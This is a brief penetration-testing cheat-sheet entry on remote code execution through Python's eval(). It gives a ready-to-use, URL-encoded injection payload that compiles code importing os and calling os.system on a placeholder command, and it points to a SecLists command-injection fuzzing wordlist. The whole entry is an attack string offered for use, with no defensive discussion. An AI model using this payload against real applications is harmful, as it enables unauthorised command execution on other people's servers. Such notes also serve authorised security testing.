Python RCE using eval():
---
#rce #python #eval

Python "eval" payload:
```python
'%2beval(compile('for x in range(1):\n import os\n os.system("$CMD")','anything','single'))%2b'
```

Seclists RCE Payloads
```lists
/usr/share/seclists/Fuzzing/command-injection-commix.txt
```
